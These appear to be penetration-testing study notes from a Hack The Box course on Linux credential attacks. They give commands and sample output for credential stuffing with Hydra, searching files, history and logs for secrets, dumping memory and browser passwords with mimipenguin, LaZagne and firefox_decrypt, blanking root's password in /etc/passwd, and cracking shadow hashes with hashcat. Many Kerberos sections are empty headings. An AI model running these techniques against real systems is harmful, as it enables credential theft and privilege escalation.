Default credentials can also be found in the product documentation, as they contain the steps necessary to set up the service successfully. Some devices/applications require the user to set up a password at install, but others use a default, weak password. Attacking those services with the default or obtained credentials is called Credential Stuffing.

```
https://owasp.org/www-community/attacks/Credential_stuffing
```
This is a simplified variant of brute-forcing because only composite usernames and the associated passwords are used.

We can imagine that we have found some applications used in the network by our customers. After searching the internet for the default credentials, we can create a new list that separates these composite credentials with a colon (username:password). In addition, we can select the passwords and mutate them by our rules to increase the probability of hits.

### Credential Stuffing - Hydra Syntax

```
Suljov@htb[/htb]$ hydra -C <user_pass.list> <protocol>://<IP>
```
### Credential Stuffing - Hydra

```
Suljov@htb[/htb]$ hydra -C user_pass.list ssh://10.129.42.197
...

```

Here, OSINT plays another significant role. Because OSINT gives us a "feel" for how the company and its infrastructure are structured, we will understand which passwords and user names we can combine. We can then store these in our lists and use them afterward. In addition, we can use Google to see if the applications we find have hardcoded credentials that can be used.

### Google Search - Default Credentials

![image](https://user-images.githubusercontent.com/24814781/203636820-19ca5c50-da00-43a1-85f4-c0e2dd8505cf.png)

Besides the default credentials for applications, some lists offer them for routers. One of these lists can be found here. It is much less likely that the default credentials for routers are left unchanged. Since these are the central interfaces for networks, administrators typically pay much closer attention to hardening them. Nevertheless, it is still possible that a router is overlooked or is currently only being used in the internal network for test purposes, which we can then exploit for further attacks.

![image](https://user-images.githubusercontent.com/24814781/203636874-ff8bd3f8-9e83-4f7f-98e6-78d246a77575.png)

----

## Linux Credential Storage
As we already know, Linux-based systems handle everything in the form of a file. Accordingly, passwords are also stored encrypted in a file. This file is called the shadow file and is located in /etc/shadow and is part of the Linux user management system. In addition, these passwords are commonly stored in the form of hashes. An example can look like this:

## Shadow File
``` 
root@htb:~# cat /etc/shadow

...SNIP...
htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
```
The /etc/shadow file has a unique format in which the entries are entered and saved when new users are created.

![image](https://user-images.githubusercontent.com/24814781/203430939-9dab54f4-7556-49fb-abed-de9be894c049.png)

The encryption of the password in this file is formatted as follows:

![image](https://user-images.githubusercontent.com/24814781/203431003-9176ba26-347d-4505-93b7-ae34b66fd5a4.png)

The type (id) is the cryptographic hash method used to encrypt the password. Many different cryptographic hash methods were used in the past and are still used by some systems today.

```
ID 	        Cryptographic Hash Algorithm
$1$ 	      MD5  - https://en.wikipedia.org/wiki/MD5
$2a$ 	      Blowfish  - https://en.wikipedia.org/wiki/Blowfish_(cipher)
$5$ 	      SHA-256  - https://en.wikipedia.org/wiki/SHA-2
$6$ 	      SHA-512  - https://en.wikipedia.org/wiki/SHA-2
$sha1$     	SHA1crypt  - https://en.wikipedia.org/wiki/SHA-1
$y$ 	      Yescrypt  - https://github.com/openwall/yescrypt
$gy$        Gost-yescrypt  - https://www.openwall.com/lists/yescrypt/2019/06/30/1
$7$      	 Scrypt  - https://en.wikipedia.org/wiki/Scrypt
```

However, a few more files belong to the user management system of Linux. The other two files are /etc/passwd and /etc/group. In the past, the encrypted password was stored together with the username in the /etc/passwd file, but this was increasingly recognized as a security problem because the file can be viewed by all users on the system and must be readable. The /etc/shadow file can only be read by the user root.

## Passwd File
```
Suljov@htb[/htb]$ cat /etc/passwd

...SNIP...
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

![image](https://user-images.githubusercontent.com/24814781/203431604-0f5d17df-0801-47c9-aa6e-55e97ea74b71.png)

The x in the password field indicates that the encrypted password is in the /etc/shadow file. However, the redirection to the /etc/shadow file does not make the users on the system invulnerable because if the rights of this file are set incorrectly, the file can be manipulated so that the user root does not need to type a password to log in. Therefore, an empty field means that we can log in with the username without entering a password.

https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf


## Credential Hunting in Linux

Hunting for credentials is one of the first steps once we have access to the system. These low-hanging fruits can give us elevated privileges within seconds or minutes. Among other things, this is part of the local privilege escalation process that we will cover here. However, it is important to note here that we are far from covering all possible situations and therefore focus on the different approaches.

We can imagine that we have successfully gained access to a system via a vulnerable web application and have therefore obtained a reverse shell, for example. Therefore, to escalate our privileges most efficiently, we can search for passwords or even whole credentials that we can use to log in to our target. There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:

![image](https://user-images.githubusercontent.com/24814781/204114166-666ed3b0-51d1-4c21-9d5b-abff3721d9f8.png)

Enumerating all these categories will allow us to increase the probability of successfully finding out with some ease credentials of existing users on the system. There are countless different situations in which we will always see different results. Therefore, we should adapt our approach to the circumstances of the environment and keep the big picture in mind. Above all, it is crucial to keep in mind how the system works, its focus, what purpose it exists for, and what role it plays in the business logic and the overall network. For example, suppose it is an isolated database server. In that case, we will not necessarily find normal users there since it is a sensitive interface in the management of data to which only a few people are granted access.

## Files

One core principle of Linux is that everything is a file. Therefore, it is crucial to keep this concept in mind and search, find and filter the appropriate files according to our requirements. We should look for, find, and inspect several categories of files one by one. These categories are the following:

![image](https://user-images.githubusercontent.com/24814781/204114338-efb0d950-f553-4cb0-9dc8-b82b3c94a53d.png)

Configuration files are the core of the functionality of services on Linux distributions. Often they even contain credentials that we will be able to read. Their insight also allows us to understand how the service works and its requirements precisely. Usually, the configuration files are marked with the following three file extensions (.config, .conf, .cnf). However, these configuration files or the associated extension files can be renamed, which means that these file extensions are not necessarily required. Furthermore, even when recompiling a service, the required filename for the basic configuration can be changed, which would result in the same effect. However, this is a rare case that we will not encounter often, but this possibility should not be left out of our search.

The most crucial part of any system enumeration is to obtain an overview of it. Therefore, the first step should be to find all possible configuration files on the system, which we can then examine and analyze individually in more detail. There are many methods to find these configuration files, and with the following method, we will see we have reduced our search to these three file extensions.

## Configuration Files
```
cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/NetworkManager/resolv.conf
/run/NetworkManager/no-stub-resolv.conf
/run/NetworkManager/conf.d/10-globally-managed-devices.conf
...SNIP...
/etc/ltrace.conf
/etc/rygel.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/fprintd.conf

File extension:  .config
/usr/src/linux-headers-5.13.0-27-generic/.config
/usr/src/linux-headers-5.11.0-27-generic/.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/power/acpi/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/power/acpi/Makefile.config
/home/cry0l1t3/.config
/etc/X11/Xwrapper.config
/etc/manpath.config

File extension:  .cnf
/etc/ssl/openssl.cnf
/etc/alternatives/my.cnf
/etc/mysql/my.cnf
/etc/mysql/debian.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/mysql.conf.d/mysql.cnf
/etc/mysql/mysql.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/mysql.cnf
```

Optionally, we can save the result in a text file and use it to examine the individual files one after the other. Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (user, password, pass) in each file with the file extension .cnf.

## Credentials in Configuration Files
```
cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

File:  /snap/core18/2128/etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /usr/share/ssl-cert/ssleay.cnf

File:  /etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /etc/alternatives/my.cnf

File:  /etc/mysql/my.cnf

File:  /etc/mysql/debian.cnf

File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user		= mysql

File:  /etc/mysql/mysql.conf.d/mysql.cnf

File:  /etc/mysql/mysql.cnf

File:  /etc/mysql/conf.d/mysqldump.cnf

File:  /etc/mysql/conf.d/mysql.cnf
```

We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.

## Databases
```
cry0l1t3@unixclient:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db

DB File extension:  .*db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-device-volumes.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-stream-volumes.tdb
/home/cry0l1t3/.cache/tracker/meta.db
/home/cry0l1t3/.cache/tracker/ontologies.gvdb

DB File extension:  .db*
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.dbus
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db-shm
/home/cry0l1t3/.cache/tracker/meta.db-wal
/home/cry0l1t3/.cache/tracker/meta.db
```

Depending on the environment we are in and the purpose of the host we are on, we can often find notes about specific processes on the system. These often include lists of many different access points or even their credentials. However, it is often challenging to find notes right away if stored somewhere on the system and not on the desktop or in its subfolders. This is because they can be named anything and do not have to have a specific file extension, such as .txt. Therefore, in this case, we need to search for files including the .txt file extension and files that have no file extension at all.

## Notes
```
cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"

/home/cry0l1t3/.config/caja/desktop-metadata
/home/cry0l1t3/.config/clipit/clipitrc
/home/cry0l1t3/.config/dconf/user
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt
...SNIP...
```

Scripts are files that often contain highly sensitive information and processes. Among other things, these also contain credentials that are necessary to be able to call up and execute the processes automatically. Otherwise, the administrator or developer would have to enter the corresponding password each time the script or the compiled program is called.

## Scripts
```
cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

File extension:  .py

File extension:  .pyc

File extension:  .pl

File extension:  .go

File extension:  .jar

File extension:  .c

File extension:  .sh
/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
/snap/core18/2128/etc/init.d/hwclock.sh
/snap/core18/2128/etc/wpa_supplicant/action_wpa.sh
/snap/core18/2128/etc/wpa_supplicant/functions.sh
...SNIP...
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/apps-bin-path.sh
```

Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (/etc/crontab) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (/etc/cron.daily, /etc/cron.hourly, /etc/cron.monthly, /etc/cron.weekly). The scripts and files used by cron can also be found in /etc/cron.d/ for Debian-based distributions.

## Cronjobs
```
cry0l1t3@unixclient:~$ cat /etc/crontab 

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```
```
cry0l1t3@unixclient:~$ ls -la /etc/cron.*/

/etc/cron.d/:
total 28
drwxr-xr-x 1 root root  106  3. Jan 20:27 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
-rw-r--r-- 1 root root  607 25. Jan 2021  john
-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
-rw-r--r-- 1 root root  712 11. Mai 2020  php
-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat

/etc/cron.daily/:
total 68
drwxr-xr-x 1 root root  252  6. Jan 16:24 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
...SNIP...
```

## SSH Keys

SSH keys can be considered "access cards" for the SSH protocol used for the public key authentication mechanism. A file is generated for the client (Private key) and a corresponding one for the server (Public key). However, these are not the same, so knowing the public key is insufficient to find a private key. The public key can verify signatures generated by the private SSH key and thus enables automatic login to the server. Even if unauthorized persons get hold of the public key, it is almost impossible to calculate the matching private one from it. When connecting to the server using the private SSH key, the server checks whether the private key is valid and lets the client log in accordingly. Thus, passwords are no longer needed to connect via SSH.

Since the SSH keys can be named arbitrarily, we cannot search them for specific names. However, their format allows us to identify them uniquely because, whether public key or private key, both have unique first lines to distinguish them.

## SSH Private Keys
```
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

## SSH Public Keys
```
cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db.pub:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCraK
```

## History

All history files provide crucial information about the current and past/historical course of processes. We are interested in the files that store users' command history and the logs that store information about system processes.

In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in .bash_history. Nevertheless, other files like .bashrc or .bash_profile can contain important information.

## Bash History
```
cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*

==> /home/cry0l1t3/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK

==> /home/cry0l1t3/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

## Logs

An essential concept of Linux systems is log files that are stored in text files. Many programs, especially all services and the system itself, write such files. In them, we find system errors, detect problems regarding services or follow what the system is doing in the background. The entirety of log files can be divided into four categories:

*  Application Logs 	
*  Event Logs 	
*  Service Logs 	
*  System Logs
*  

Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:

![image](https://user-images.githubusercontent.com/24814781/204114441-2758f131-c0e3-402d-b10e-d691d99090d8.png)

Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats. However, here are some strings we can use to find interesting content in the logs:

```
cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

#### Log file:  /var/log/dpkg.log.1
2022-01-10 17:57:41 install libssh-dev:amd64 <none> 0.9.5-1+deb11u1
2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 <none> 
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1

...SNIP...
```

## Memory and Cache

Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called mimipenguin 
```
https://github.com/huntergregal/mimipenguin
```
that makes the whole process easier. However, this tool requires administrator/root permissions.

## Memory - Mimipenguin
```
cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
[sudo] password for cry0l1t3: 

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY


cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh 
[sudo] password for cry0l1t3: 

MimiPenguin Results:
[SYSTEM - GNOME]          cry0l1t3:WLpAEXFa0SbqOHY
```

An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is LaZagne. This tool allows us to access far more resources and extract the credentials. The passwords and hashes we can obtain come from the following sources but are not limited to:

![image](https://user-images.githubusercontent.com/24814781/204114482-67a0a9d5-e590-48bb-8a2e-7f55008b2ce4.png)

For example, Keyrings are used for secure storage and management of passwords on Linux distributions. Passwords are stored encrypted and protected with a master password. It is an OS-based password manager, which we will discuss later in another section. This way, we do not need to remember every single password and can save repeated password entries.

## Memory - LaZagne
```
cry0l1t3@unixclient:~$ sudo python2.7 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: --REDACTED--
Hash: --REDACTED--

[+] Password found !!!
Login: --REDACTED--
Password: --REDACTED--


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50091600418
```

## Browsers

Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused. For example, the Mozilla Firefox browser stores the credentials encrypted in a hidden folder for the respective user. These often include the associated field names, URLs, and other valuable information.

For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in logins.json on the system. However, this does not mean that they are safe there. Many employees store such login data in their browser without suspecting that it can easily be decrypted and used against the company.

## Firefox Stored Credentials
```
cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

```
cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```
The tool Firefox Decrypt
```
https://github.com/unode/firefox_decrypt
```
is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, Firefox Decrypt 0.7.0 with Python 2 must be used.

## Decrypting Firefox Credentials
```
Suljov@htb[/htb]$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: '--REDACTED--'
Password: '--REDACTED--'

Website:   https://www.inlanefreight.com
Username: '--REDACTED--'
Password: '--REDACTED--'
```
Alternatively, LaZagne can also return results if the user has used the supported browser.

## Browsers - LaZagne

```
cry0l1t3@unixclient:~$ python3 laZagne.py browsers

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: --REDACTED--
Password: --REDACTED--

[+] Password found !!!
URL: https://www.inlanefreight.com
Login: --REDACTED--
Password: --REDACTED--


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.2310788631439209
```

## Passwd and Shadow and Opasswd

Linux-based distributions can use many different authentication mechanisms. One of the most commonly used and standard mechanisms is Pluggable Authentication Modules (PAM).
link dont seem to work now
```
https://github.com/linux-pam/linux-pam/Linux-PAM-html/Linux-PAM_SAG.html
```

The modules used for this are called pam_unix.so or pam_unix2.so and are located in /usr/lib/x86_x64-linux-gnu/security/ in Debian based distributions. These modules manage user information, authentication, sessions, current passwords, and old passwords. For example, if we want to change the password of our account on the Linux system with passwd, PAM is called, which takes the appropriate precautions and stores and handles the information accordingly.

The pam_unix.so standard module for management uses standardized API calls from the system libraries and files to update the account information. The standard files that are read, managed, and updated are /etc/passwd and /etc/shadow. PAM also has many other service modules, such as LDAP, mount, or Kerberos.

## Passwd File

The /etc/passwd file contains information about every existing user on the system and can be read by all users and services. Each entry in the /etc/passwd file identifies a user on the system. Each entry has seven fields containing a form of a database with information about the particular user, where a colon (:) separates the information. Accordingly, such an entry may look something like this:

## Passwd Format
![image](https://user-images.githubusercontent.com/24814781/204116851-b2e0abc1-5f95-4cda-acb2-23830be0e619.png)

The most interesting field for us is the Password information field in this section because there can be different entries here. One of the rarest cases that we may find only on very old systems is the hash of the encrypted password in this field. Modern systems have the hash values stored in the /etc/shadow file, which we will come back to later. Nevertheless, /etc/passwd is readable system-wide, giving attackers the possibility to crack the passwords if hashes are stored here.

Usually, we find the value x in this field, which means that the passwords are stored in an encrypted form in the /etc/shadow file. However, it can also be that the /etc/passwd file is writeable by mistake. This would allow us to clear this field for the user root so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as root.

## Editing etc passwd - Before
```
root:x:0:0:root:/root:/bin/bash
```

## Editing etc passwd - After
```
root::0:0:root:/root:/bin/bash
```

## Root without Password
```
[cry0l1t3@parrot]─[~]$ head -n 1 /etc/passwd

root::0:0:root:/root:/bin/bash


[cry0l1t3@parrot]─[~]$ su

[root@parrot]─[/home/cry0l1t3]#
```

Even though the cases shown will rarely occur, we should still pay attention and watch for security gaps because there are applications that require us to set specific permissions for entire folders. If the administrator has little experience with Linux or the applications and their dependencies, the administrator may give write permissions to the /etc directory and forget to correct them.

## Shadow File

Since reading the password hash values can put the entire system in danger, the file /etc/shadow was developed, which has a similar format to /etc/passwd but is only responsible for passwords and their management. It contains all the password information for the created users. For example, if there is no entry in the /etc/shadow file for a user in /etc/passwd, the user is considered invalid. The /etc/shadow file is also only readable by users who have administrator rights. The format of this file is divided into nine fields:

## Shadow Format

![image](https://user-images.githubusercontent.com/24814781/204116890-06802dd1-a5f6-40e1-9a83-0dc152f9604a.png)

## Shadow File
```
[cry0l1t3@parrot]─[~]$ sudo cat /etc/shadow

root:*:18747:0:99999:7:::
sys:!:18747:0:99999:7:::
...SNIP...
cry0l1t3:$6$wBRzy$...SNIP...x9cDWUxW1:18937:0:99999:7:::
```

If the password field contains a character, such as ! or *, the user cannot log in with a Unix password. However, other authentication methods for logging in, such as Kerberos or key-based authentication, can still be used. The same case applies if the encrypted password field is empty. This means that no password is required for the login. However, it can lead to specific programs denying access to functions. The encrypted password also has a particular format by which we can also find out some information:


*    $<type>$<salt>$<hashed>

As we can see here, the encrypted passwords are divided into three parts. The types of encryption allow us to distinguish between the following:

## Algorithm Types

*    $1$ – MD5
*    $2a$ – Blowfish
*    $2y$ – Eksblowfish
*    $5$ – SHA-256
*    $6$ – SHA-512

By default, the SHA-512 ($6$) encryption method is used on the latest Linux distributions. We will also find the other encryption methods that we can then try to crack on older systems. We will discuss how the cracking works in a bit.

## Opasswd

The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.

## Reading etc security opasswd
```
Suljov@htb[/htb]$ sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

Looking at the contents of this file, we can see that it contains several entries for the user cry0l1t3, separated by a comma (,). Another critical point to pay attention to is the hashing type that has been used. This is because the MD5 ($1$) algorithm is much easier to crack than SHA-512. This is especially important for identifying old passwords and maybe even their pattern because they are often used across several services or applications. We increase the probability of guessing the correct password many times over based on its pattern.

## Cracking Linux Credentials

Once we have collected some hashes, we can try to crack them in different ways to get the passwords in cleartext.

## Unshadow
```
Suljov@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
Suljov@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
Suljov@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

## Hashcat - Cracking Unshadowed Hashes
```
Suljov@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

## Hashcat - Cracking MD5 Hashes
```
Suljov@htb[/htb]$ cat md5-hashes.list

qNDkF0zJ3v8ylCOrKB0kt0
E9uMSmiQeRh4pAAgzuvkq1
```
```
Suljov@htb[/htb]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

## Pass the Ticket PtT from Linux


## Kerberos on Linux


## Linux Auth via Port Forward


## Identifying Linux and Active Directory Integration


## PS - Check if Linux Machine is Domain Joined


## Finding Kerberos Tickets in Linux


## Finding Keytab Files


## Using Find to Search for Files with Keytab in the Name


## Identifying Keytab Files in Cronjobs


## Finding ccache Files


## Reviewing Environment Variables for ccache Files


## Searching for ccache Files in tmp
  
  
  
##  Abusing KeyTab Files
  


## Listing keytab File Information
  
  
  
## Impersonating a User with-a keytab

  

## Connecting to SMB Share as a user


## Keytab Extract
  
  
  
## Extracting Keytab Hashes with KeyTabExtract

  

## Log in as a user


  
## Obtaining More Hashes

  

##  Privilege Escalation to Root



## Abusing Keytab ccache



## Looking for ccache Files



##  Identifying Group ZMembership with the id Command



## Importing the ccache File into our Current Session



## Using Linux Attack Tools with Kerberos



## Host File Modified



## Proxychains Configuration File



## Download Chisel to our Attack Host



## Connect to a host with xfreerdp



## Execute chisel from host



## Setting the KRB5CCNAME Environment Variable



## Using Impacket with proxychains and Kerberos Authentication



## Installing Kerberos Authentication Package



## Default Kerberos Version 5 realm



## Administrative Server for your Kerberos Realm



## Kerberos Configuration File for a domain



## Using Evil-WinRM with Kerberos



## Miscellaneous



## Impacket Ticket Converter



## Importing Converted Ticket into Windows Session with Rubeus



## Linikatz



## 



----------------------------------------------------------------------------------------------------------------------------------------

## Password Mutations

Many people create their passwords according to simplicity instead of security. To eliminate this human weakness that often compromises security measures, password policies can be created on all systems that determine how a password should look. This means that the system recognizes whether the password contains capital letters, special characters, and numbers. In addition, most password policies require a minimum length of eight characters in a password, including at least one of the above specifications.

In the previous sections, we guessed very simple passwords, but it becomes much more difficult to adapt this to systems that apply password policies that force the creation of more complex passwords.

Unfortunately, the tendency for users to create weak passwords also occurs despite the existence of password policies. Most people/employees follow the same rules when creating more complex passwords. Passwords are often created closely related to the service used. This means that many employees often select passwords that can have the company's name in the passwords. A person's preferences and interests also play a significant role. These can be pets, friends, sports, hobbies, and many other elements of life. OSINT information gathering can be very helpful for finding out more about a user's preferences and may assist with password guessing.

Commonly, users use the following additions for their password to fit the most common password policies:

![image](https://user-images.githubusercontent.com/24814781/203631831-dc4199e9-e10d-4090-9af4-2c0acb0b733d.png)

Considering that many people want to keep their passwords as simple as possible despite password policies, we can create rules for generating weak passwords. Based on statistics provided by WPengine
```
https://wpengine.com/resources/passwords-unmasked-infographic/
```

most password lengths are not longer than ten characters. So what we can do is to pick specific terms that are at least five characters long and seem to be the most familiar to the users, such as the names of their pets, hobbies, preferences, and other interests. If the user chooses a single word (such as the current month), adds the current year, followed by a special character, at the end of their password, we would reach the ten-character password requirement. Considering that most companies require regular password changes, a user can modify their password by just changing the name of a month or a single number, etc. Let's use a simple example to create a password list with only one entry.

### Password List
example:
```
Suljov@htb[/htb]$ cat password.list
